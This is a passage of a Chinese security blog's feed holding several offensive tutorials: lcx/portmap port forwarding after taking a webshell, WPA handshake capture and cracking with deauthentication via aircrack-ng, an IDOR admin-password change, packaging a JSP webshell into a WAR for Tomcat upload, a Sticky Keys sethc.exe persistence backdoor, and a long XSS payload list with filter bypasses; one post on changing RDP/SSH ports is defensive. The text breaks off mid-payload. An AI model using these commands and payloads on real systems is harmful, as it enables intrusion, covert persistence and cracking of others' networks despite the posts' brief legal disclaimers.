    <content type="html"><![CDATA[<h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>偶尔会遇到，拿下了webshell. 远程端口是开启的，但是远程不了，这可能遇到了部署在内网的服务器，终端端口没有映射到公网。这时我们就需要进行内网端口转发， 进而扩大成果。前提是需要一台公网主机，用来监听端口 。 </p><h4 id="1、lcx-使用方法"><a href="#1、lcx-使用方法" class="headerlink" title="1、lcx 使用方法"></a>1、lcx 使用方法</h4><p>首先用公网主机监听 9999 端口，等待接收数据，接收到数据之后把接收到的数据转发到公网主机的 1234 端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># vps监听 9999 端口，把接收到的数据转发到 1234 端口</span><br>lcx.exe -listen 9999 1234<br><span class="hljs-comment"># 内网服务器上转发终端端口 3389 到vps的 9999 端口</span><br>lcx.exe -slave vps 9999 localhost 3389<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/20191118204025-1-1719818657234-1.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/20191118204438-1719818659010-3.png" alt="img"></p><h4 id="2、portmap-使用方法"><a href="#2、portmap-使用方法" class="headerlink" title="2、portmap 使用方法"></a>2、portmap 使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./portmap -m 2 -p1 18080 -h2 vps_ip -p2 18081<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>端口转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali破解wifi密码</title>
    <link href="/2024/07/01/kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/"/>
    <url>/2024/07/01/kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="1、设置无线网卡"><a href="#1、设置无线网卡" class="headerlink" title="1、设置无线网卡"></a>1、设置无线网卡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看无线网卡信息</span><br>iwconfig<br><br><span class="hljs-comment"># 结束可能影响监听模式的进程（如NetworkManager等）</span><br>airmon-ng check <span class="hljs-built_in">kill</span><br><br><span class="hljs-comment"># 启用监听模式，网卡名通常从 wlan0 变成 wlan0mon</span><br>airmon-ng start wlan0<br><br><span class="hljs-comment"># 扫描周围WiFi热点</span><br>airodump-ng wlan0mon<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png" alt="扫描WiFi热点"></p><hr><h3 id="2、抓取数据包"><a href="#2、抓取数据包" class="headerlink" title="2、抓取数据包"></a>2、抓取数据包</h3><p>用 airodump-ng 针对目标WiFi抓包，捕获握手包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -c 信道号， --bssid 目标路由器MAC， -w 保存文件名前缀</span><br>airodump-ng wlan0mon -c 8 --bssid D4:**:**:**:**:E0 -w <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/InkedQQ%E6%88%AA%E5%9B%BE20191128205416_LI-1719817694811-3.jpg" alt="抓包界面"></p><hr><h3 id="3、WiFi攻击（断开连接）"><a href="#3、WiFi攻击（断开连接）" class="headerlink" title="3、WiFi攻击（断开连接）"></a>3、WiFi攻击（断开连接）</h3><p>用 aireplay-ng 发送断开请求，强制目标设备重新连接，方便抓握手包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 参数说明：</span><br><span class="hljs-comment"># -0 攻击次数，0 表示无限循环</span><br><span class="hljs-comment"># -a 目标AP的BSSID</span><br><span class="hljs-comment"># -c 目标客户端设备MAC，指定单个设备；不指定则攻击所有已连接设备</span><br><br>aireplay-ng -0 10 -a D4:**:**:**:**:E0 -c 30:**:**:**:**:23 wlan0mon<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205458-1719817696845-5.png" alt="断开连接攻击"></p><hr><h3 id="4、爆破WiFi密码"><a href="#4、爆破WiFi密码" class="headerlink" title="4、爆破WiFi密码"></a>4、爆破WiFi密码</h3><p>使用 aircrack-ng 和密码字典，尝试破解抓到的握手包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -w 指定密码字典路径</span><br><span class="hljs-comment"># test.cap 是抓到的握手包文件名</span><br><br>aircrack-ng -w password.txt test.cap<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205203-1719817698614-7.png" alt="爆破结果"></p><hr><h2 id="⚠️-法律与道德提示"><a href="#⚠️-法律与道德提示" class="headerlink" title="⚠️ 法律与道德提示"></a>⚠️ 法律与道德提示</h2><ul><li>请勿攻击未授权的WiFi网络，破解他人网络密码可能触犯法律。</li><li>该教程仅供安全研究和个人合法测试使用。</li><li>推荐在自己拥有的设备和网络环境下实践学习。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wifi攻击</tag>
      
      <tag>密码破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈越权漏洞</title>
    <link href="/2024/07/01/%E6%B5%85%E8%B0%88%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/07/01/%E6%B5%85%E8%B0%88%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介🚀"><a href="#0、简介🚀" class="headerlink" title="0、简介🚀"></a>0、简介🚀</h4><p>​<strong>越权</strong>（Horizontal&#x2F;Vertical Privilege Escalation）是渗透测试和 Web 安全审计中经常遇到的一种安全漏洞，通常出现在后台管理、用户敏感操作（如修改密码、查看订单、管理用户）等场景中。<br>越权简单来说就是用户通过非法手段访问或操作本不属于自己权限范围内的资源或功能，主要分为<strong>水平越权</strong>（同级用户之间）和<strong>垂直越权</strong>（低权限用户获取高权限操作能力）。</p><hr><h4 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h4><p>​造成越权漏洞的根本原因是<strong>服务端没有对用户的操作做严格的权限校验</strong> ⚠️。<br>很多开发者在前端或接口只依赖用户提交的 ID、用户名等参数，却没有在后端再次验证该用户是否对目标资源拥有实际权限。</p><p>常见的越权手段有：</p><ul><li>✏️ 修改请求参数（如用户 ID、订单号）。</li><li>🕵️‍♂️ 调用隐藏接口或未授权接口。</li><li>🎭 绕过前端验证直接使用抓包工具篡改请求。</li><li>🔑 利用弱口令或信息泄露先拿到可用的目标 ID。</li></ul><hr><h4 id="2、案例示例"><a href="#2、案例示例" class="headerlink" title="2、案例示例"></a>2、案例示例</h4><p>​下面通过一个简单的示例演示如何通过抓包篡改参数实现越权：</p><p><strong>Burp 抓请求包：</strong></p><p>1️⃣ 使用普通用户 <code>test</code> 登录，抓取修改密码的请求包，发现参数里带有 <code>admin_id=2</code>：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><br>POST /update_password<br>...<br>admin_id=<span class="hljs-number">2</span>\&amp;<span class="hljs-keyword">new</span><span class="hljs-type">_password</span>=<span class="hljs-number">123456</span><br><br></code></pre></td></tr></table></figure><p>2️⃣ 将 <code>admin_id</code> 修改为 <code>1</code>（已知是管理员账号 ID）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">admin_id</span>=<span class="hljs-number">1</span>\&amp;new_password=<span class="hljs-number">123456</span><br><br></code></pre></td></tr></table></figure><p>3️⃣ 发送修改后的请求，成功修改了管理员的密码，之后用新密码登录后台，即完成了越权 ✅。</p><p>示例截图：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1024x370.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1-1024x603.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-3-1024x337.png" alt="img"></p><hr><h4 id="3、危害"><a href="#3、危害" class="headerlink" title="3、危害"></a>3、危害</h4><p>​越权漏洞通常危害严重 🚨，可能导致：</p><ul><li>🔓 非法获取他人敏感信息（如订单、用户资料）。</li><li>👤 冒充他人进行操作（如转账、改密、发帖）。</li><li>🛠️ 低权限用户执行管理操作，拿到后台控制权。</li><li>📂 泄露公司内部敏感数据，导致重大损失。</li></ul><hr><h4 id="4、常见场景"><a href="#4、常见场景" class="headerlink" title="4、常见场景"></a>4、常见场景</h4><ul><li>🧾 用户资料查看和修改（如 <code>user_id</code> 参数可控）。</li><li>📄 文件下载、查看历史订单等功能。</li><li>🔒 后台管理接口未做二次身份校验。</li><li>📱 移动端或小程序 API 漏洞，服务端只依赖 token 或参数。</li></ul><hr><h4 id="5、防御与修复"><a href="#5、防御与修复" class="headerlink" title="5、防御与修复"></a>5、防御与修复</h4><p>​要有效防御越权漏洞，核心原则是<strong>后端必须进行权限校验</strong> 🔐，永远不要仅依赖前端验证。<br>常见防御措施包括：</p><ul><li>✅ 在服务端对每个请求做身份认证和授权检查。</li><li>🔗 严格绑定资源与用户身份（如只能操作自己拥有的资源）。</li><li>🚫 不信任客户端传来的任何用户 ID，使用后端获取的用户信息。</li><li>🛡️ 对关键操作增加二次校验（如操作验证码、双因子认证）。</li><li>🔍 定期进行渗透测试和代码审计。</li></ul><hr><h4 id="6、总结"><a href="#6、总结" class="headerlink" title="6、总结"></a>6、总结</h4><p>​越权是 Web 安全中十分常见且危害巨大的漏洞 💥，开发者和安全人员都需要重视，做到<strong>“不信任用户输入，权限在后端校验”</strong> 🔑。<br>对于渗透测试人员来说，通过逻辑分析、参数 fuzz 和漏洞挖掘，可以有效发现和利用此类漏洞，从而帮助企业修补薄弱环节，提升整体安全性 📈。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>越权漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>制作 WAR 后门，实现上传木马拿 Shell</title>
    <link href="/2024/07/01/%E5%88%B6%E4%BD%9C%20war%E5%90%8E%E9%97%A8%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%20getshell/"/>
    <url>/2024/07/01/%E5%88%B6%E4%BD%9C%20war%E5%90%8E%E9%97%A8%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%20getshell/</url>
    
    <content type="html"><![CDATA[<h3 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h3><p>发现后台存在 WAR 文件上传点，可以通过上传带有后门的 WAR 包，实现 Webshell 的落地和远程控制。</p><blockquote><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20200113091803-1024x263.png" alt="后台WAR上传点示例"></p></blockquote><hr><h3 id="1、制作-WAR-木马"><a href="#1、制作-WAR-木马" class="headerlink" title="1、制作 WAR 木马"></a>1、制作 WAR 木马</h3><p>以管理员权限打开 CMD，切换到 JDK 的 <code>bin</code> 目录，使用 <code>jar</code> 命令将 JSP 木马打包成 WAR 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\Program Files\Java\jdk1.8.0_131\bin&quot;</span><br>jar cvf shell.war xx.jsp<br></code></pre></td></tr></table></figure><p>具体操作截图：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20200113093055.png" alt="制作WAR包步骤1"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20200113093152.png" alt="制作WAR包步骤2"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20200113093235.png" alt="制作WAR包步骤3"></p><hr><h3 id="2、上传并获取-Shell"><a href="#2、上传并获取-Shell" class="headerlink" title="2、上传并获取 Shell"></a>2、上传并获取 Shell</h3><p>将 <code>shell.war</code> 文件上传到后台上传点后，通过蚁剑或菜刀等 Webshell 管理工具访问：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">8080</span>/shell/xx.jsp<br></code></pre></td></tr></table></figure><p>成功拿到 Shell 后，可以远程执行命令。</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20200113094609-1024x440.png" alt="Webshell访问示例"></p><hr><p>💡 <strong>提示</strong></p><ul><li>制作木马时，<code>xx.jsp</code> 文件需为功能完整的 Webshell 脚本。</li><li>上传前确保目标服务器支持 WAR 包自动部署（如 Tomcat）。</li><li>此技巧用于安全测试，禁止用于非法攻击。</li></ul><hr><p>这样，你就可以通过上传 WAR 包木马，快速实现 Webshell 获取和远程控制。</p>]]></content>
    
    
    
    <tags>
      
      <tag>后门</tag>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>制作 Shift 后门，维持访问权限</title>
    <link href="/2024/07/01/%E5%88%B6%E4%BD%9C%20shift%20%E5%90%8E%E9%97%A8%EF%BC%8C%E7%BB%B4%E6%8C%81%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/"/>
    <url>/2024/07/01/%E5%88%B6%E4%BD%9C%20shift%20%E5%90%8E%E9%97%A8%EF%BC%8C%E7%BB%B4%E6%8C%81%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/</url>
    
    <content type="html"><![CDATA[<h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>利用 Windows 系统的“粘滞键”（Sticky Keys）功能制作后门。通过连续按下 <strong>Shift</strong> 键 5 次，可以调出命令行窗口，且命令行以 SYSTEM 权限运行，从而维持对系统的高权限访问。</p><hr><h3 id="2、制作方法"><a href="#2、制作方法" class="headerlink" title="2、制作方法"></a>2、制作方法</h3><p>打开管理员权限的 CMD，执行以下命令，将 <code>cmd.exe</code> 复制替换为 <code>sethc.exe</code>（粘滞键程序）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe<br></code></pre></td></tr></table></figure><p>这样，当锁屏状态下连按 5 次 <strong>Shift</strong>，系统会启动命令行窗口，而不是粘滞键设置界面。</p><p>运行 <code>explorer.exe</code> 命令即可进入桌面，获得 SYSTEM 最高权限。</p><hr><h3 id="3、效果演示"><a href="#3、效果演示" class="headerlink" title="3、效果演示"></a>3、效果演示</h3><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206204314.jpg" alt="粘滞键后门截图1"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206205431-1024x415.jpg" alt="粘滞键后门截图2"></p><hr><h3 id="⚠️-注意事项"><a href="#⚠️-注意事项" class="headerlink" title="⚠️ 注意事项"></a>⚠️ 注意事项</h3><ul><li>该方法需要管理员权限进行替换操作。</li><li>使用该技巧务必遵守法律法规，禁止非法入侵。</li><li>可以作为渗透测试中维持权限的有效手段。</li></ul><hr><p>用这个小技巧，可以悄无声息地维持对目标机器的访问权限，快速获取 SYSTEM 权限命令行。</p>]]></content>
    
    
    
    <tags>
      
      <tag>权限维持</tag>
      
      <tag>后门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 远程桌面端口和 SSH 端口修改</title>
    <link href="/2024/07/01/Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%AB%AF%E5%8F%A3%E5%92%8Cssh%E7%AB%AF%E5%8F%A3%E4%BF%AE%E6%94%B9/"/>
    <url>/2024/07/01/Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%AB%AF%E5%8F%A3%E5%92%8Cssh%E7%AB%AF%E5%8F%A3%E4%BF%AE%E6%94%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="🚀-0-简介"><a href="#🚀-0-简介" class="headerlink" title="🚀 0. 简介"></a>🚀 0. 简介</h2><p>修改 <strong>远程桌面 (RDP)</strong> 和 <strong>SSH</strong> 的默认端口，是最简单的防爆破手段之一。</p><blockquote><p>⚠️ <strong>重要提醒</strong><br>如果是在 <strong>阿里云</strong>、<strong>腾讯云</strong> 等云服务器上，修改前务必先在<strong>安全组策略</strong>里放行新的端口，否则可能会把自己锁在服务器外！</p></blockquote><hr><h2 id="📌-1-修改-Windows-远程桌面默认端口"><a href="#📌-1-修改-Windows-远程桌面默认端口" class="headerlink" title="📌 1. 修改 Windows 远程桌面默认端口"></a>📌 1. 修改 Windows 远程桌面默认端口</h2><p>1️⃣ 打开注册表编辑器：<br><code>Win + R</code> ➜ 输入 <code>regedit</code> ➜ 回车</p><p>2️⃣ 找到键值路径：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp<br></code></pre></td></tr></table></figure><p>3️⃣ 找到 <code>PortNumber</code>，修改为你想要的端口（推荐 1025~65535 的未占用端口）。</p><p>4️⃣ 修改完成后需重启远程桌面服务或直接重启系统。</p><p>示例：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-6-1024x631.png" alt="远程桌面注册表修改示例"></p><hr><h2 id="📌-2-修改-Linux-SSH-默认端口"><a href="#📌-2-修改-Linux-SSH-默认端口" class="headerlink" title="📌 2. 修改 Linux SSH 默认端口"></a>📌 2. 修改 Linux SSH 默认端口</h2><p>1️⃣ 编辑 SSH 配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure><p>找到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#Port 22</span><br></code></pre></td></tr></table></figure><p>去掉注释 <code>#</code>，把 <code>22</code> 改成新的端口号，如 <code>22222</code>。</p><p>2️⃣ 保存后，重启 SSH 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service ssh restart<br></code></pre></td></tr></table></figure><p>✅ 常见命令（根据系统可能是 <code>systemctl restart sshd</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># CentOS / RHEL / Fedora</span><br>systemctl restart sshd<br><br><span class="hljs-comment"># Ubuntu / Debian</span><br>service ssh restart<br></code></pre></td></tr></table></figure><p>示例：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-9-1719815552013-1.png" alt="SSH 配置修改示例"></p><hr><h2 id="🔑-小结"><a href="#🔑-小结" class="headerlink" title="🔑 小结"></a>🔑 小结</h2><ul><li>修改端口 ≠ 绝对安全，只是防小白爆破，别忘了配合强密码 &#x2F; 公钥认证。</li><li>永远记得先放行新端口再修改！</li><li>修改后可用 <code>telnet</code> 或 <code>nmap</code> 测试端口是否可访问。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>ssh</tag>
      
      <tag>远程桌面</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss漏洞的代码构造思路</title>
    <link href="/2024/07/01/xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%A3%E7%A0%81%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/"/>
    <url>/2024/07/01/xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%A3%E7%A0%81%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="📌-1、基本语句"><a href="#📌-1、基本语句" class="headerlink" title="📌 1、基本语句"></a>📌 1、基本语句</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>prompt(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>confirm(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span># 如果目标定义了<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>才能弹<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&lt;/script&gt;# 查看cookie<br><br># 图片加载错误时触发<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<br>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;<br># 鼠标指针移动到元素时触发<br>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;<br># 鼠标指针移出时触发<br>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;<br><br>&lt;a href=javascript:alert(1)&gt;<br>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;<br>&lt;a href=javascript:alert(&#x27;xss&#x27;)&gt;test&lt;/a&gt;<br>&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;<br>&lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;a&lt;/a&gt;<br>&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;<br>&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#x27;xss&#x27;) y=2016&gt;aa&lt;/a&gt;<br><br># 元素上按下鼠标时触发<br>&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;<br># 元素上释放鼠标时触发<br>&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;<br><br># 元素上点击鼠标时触发<br>&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;<br><br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br># 竞争焦点，从而触发onblur事件<br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br># 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;<br>&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;<br># 按下按键时触发<br>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;<br># 按下按键时触发<br>&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;<br># 松开按键式时触发<br>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;<br><br>&lt;form action=javascript:alert(&#x27;xss&#x27;) method=&quot;get&quot;&gt;<br>&lt;form action=javascript:alert(&#x27;xss&#x27;)&gt;<br>&lt;form method=post action=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;<br>&lt;form method=post action=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;<br>&lt;form action=1 onmouseover=alert(&#x27;xss)&gt;<br>&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;<br>&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br><br>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;<br>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;<br>&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br>&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;<br>&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><hr><h2 id="📌-2、绕过限制"><a href="#📌-2、绕过限制" class="headerlink" title="📌 2、绕过限制"></a>📌 2、绕过限制</h2><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 用 / 代替空格<br>&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>/onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&gt;<br></code></pre></td></tr></table></figure><h3 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 大小写绕过<br>&lt;<span class="hljs-title class_">ImG</span> sRc=x 